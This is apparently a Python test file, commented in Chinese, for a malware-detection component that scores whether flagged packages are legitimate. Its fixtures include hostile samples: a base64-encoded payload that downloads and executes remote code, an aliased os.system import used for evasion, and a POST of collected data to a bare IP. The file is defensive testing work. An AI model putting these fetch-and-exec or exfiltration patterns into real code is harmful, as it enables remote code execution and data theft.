# -*- coding: utf-8 -*-
"""合法性通道测试（2026-11，7 个良性 SUSPICIOUS 驱动）

钉死三件事：
  1. 真良性的敏感包能被放行（intuit_oauth / nvgpu / edn_format 形态）
  2. 真恶意不会被放行（编码载荷 + 动态 API 名 → 否决）
  3. 铁律：合法性只能降为 BENIGN，永不升为 MALICIOUS
"""
import base64
import shutil
import sys
import tempfile
from pathlib import Path

NEW_DDG = Path(__file__).parent.parent
sys.path.insert(0, str(NEW_DDG))

from src.legitimacy import (assess, declared_domains, signal_destination,
                            signal_docs, signal_code_style,
                            signal_dependencies, ALLOW_THRESHOLD)

PASS = FAIL = 0


def check(name, cond, detail=''):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ✓ {name}")
    else:
        FAIL += 1
        print(f"  ✗ {name}  {detail}")


def node(code, cap='', nid='n1'):
    return {'node_id': nid, 'code': code, 'capability': cap,
            'line': 1, 'file': '/x/a.py', 'type': 'call'}


print("[1] 声明域名解析")
root = Path(tempfile.mkdtemp(prefix='legit_'))
try:
    pkg = root / 'pkg'
    pkg.mkdir()
    (pkg / 'PKG-INFO').write_text(
        "Metadata-Version: 2.1\n"
        "Name: intuit_oauth\n"
        "Home-page: https://developer.intuit.com\n"
        "Author-email: dev@intuit.com\n"
        "Summary: OAuth client for Intuit APIs\n", encoding='utf-8')
    (pkg / 'README.md').write_text(
        "# intuit_oauth\nAn OAuth 2.0 client that manages access tokens "
        "and sends requests to the Intuit API.\n", encoding='utf-8')
    d = declared_domains(pkg)
    check("解析出声明域名", any('intuit' in x for x in d), detail=str(d))
    check("解析出邮箱域", any('intuit.com' in x for x in d), detail=str(d))

    print("[2] 四个信号")
    # ① 目的地：域名 → 1.0
    nodes_own = [node('requests.post("https://api.intuit.com/v1/token")', 'network_out')]
    s = signal_destination(nodes_own, d)
    check("外传目标是正常域名", s['score'] == 1.0, detail=str(s))

    # ① 攻击设施 → 0 + veto
    nodes_evil = [node('requests.post("http://45.77.12.9/collect")', 'network_out')]
    s2 = signal_destination(nodes_evil, d)
    check("裸 IP → 0 分并否决",
          s2['score'] == 0.0 and s2.get('veto') is True, detail=str(s2))

    # ① 解析不出 → None（不是 1.0）
    nodes_var = [node('requests.post(url=self._address + path)', 'network_out')]
    s3 = signal_destination(nodes_var, d)
    check("解析不出 → None（不知道）", s3['score'] is None, detail=str(s3))

    # ② 文档：OAuth 包用 credential/auth → 文档一致
    s4 = signal_docs(pkg, {'credential_access', 'network_out'})
    check("文档描述了该能力", s4['score'] and s4['score'] > 0.4, detail=str(s4))

    # ③ 代码风格：干净 → 1.0
    s5 = signal_code_style([node('data = parse(x)')])
    check("干净代码风格 1.0", s5['score'] == 1.0, detail=str(s5))

    # ③ 别名规避 + 编码载荷 → 0 + veto
    payload = base64.b64encode(
        b'exec(__import__("urllib.request").urlopen("http://x/y").read())').decode()
    evil_nodes = [
        node("from os import system as _ssystem"),
        node('exec(base64.b64decode("%s"))' % payload),
    ]
    s6 = signal_code_style(evil_nodes)
    check("规避 + 编码载荷 → 0 分并否决",
          s6['score'] == 0.0 and s6.get('veto') is True, detail=str(s6))

    # ④ 依赖：requests 提供 network，无已知库提供的自研能力 → None
    s7 = signal_dependencies([node('import requests')], {'network_in'})
    check("已知库支撑 → 1.0", s7['score'] == 1.0, detail=str(s7))
    s8 = signal_dependencies([node('import requests')], {'code_eval'})
    check("无库支撑 → None（不是 0）", s8['score'] is None, detail=str(s8))

    print("[3] 综合：良性放行")
    benign_nodes = [
        node('requests.post("https://api.intuit.com/v1/token")', 'network_out'),
        node('token = get_access_token()', 'credential_access'),
        node('import requests'),
    ]
    a = assess(pkg, benign_nodes, {'credential_access', 'network_out'})
    check("良性敏感包被放行",
          a['allow_benign'] is True and a['score'] >= ALLOW_THRESHOLD,
          detail=f"score={a['score']}")

    print("[4] 综合：恶意否决")
    mal_nodes = [
        node('exec(base64.b64decode("%s"))' % payload, 'code_eval'),
        node("from os import system as _ssystem"),
        node('requests.post("http://45.77.12.9/collect")', 'network_out'),
    ]
    a2 = assess(pkg, mal_nodes, {'code_eval', 'network_out'})
    check("恶意包被否决",
          a2['allow_benign'] is False and a2['score'] == 0.0,
          detail=f"score={a2['score']}")

    print("[5] 铁律：只能放行，不能定罪")
    # assess 的返回值里没有"升为恶意"的字段，且 allow_benign 只影响 BENIGN 方向
    check("返回值只含 allow_benign，无定罪字段",
          'allow_benign' in a and 'convict' not in a and 'is_malicious' not in a)
    # 明确：分数再高也不能把 BENIGN 变成别的
    src_txt = (NEW_DDG / 'batch_solution_b_v2.py').read_text(encoding='utf-8')
    import re as _re
    blk = src_txt[src_txt.index('# ===== 2026-11 合法性通道'):]
    blk = blk[:blk.index('# 精简格式')]
    check("接线只在 SUSPICIOUS 分支生效",
          "== 'SUSPICIOUS'" in blk and "= 'MALICIOUS'" not in blk,
          detail=blk[:80])
finally:
    shutil.rmtree(root, ignore_errors=True)

print()
print(f"合法性通道: PASS={PASS} FAIL={FAIL}")
sys.exit(1 if FAIL else 0)
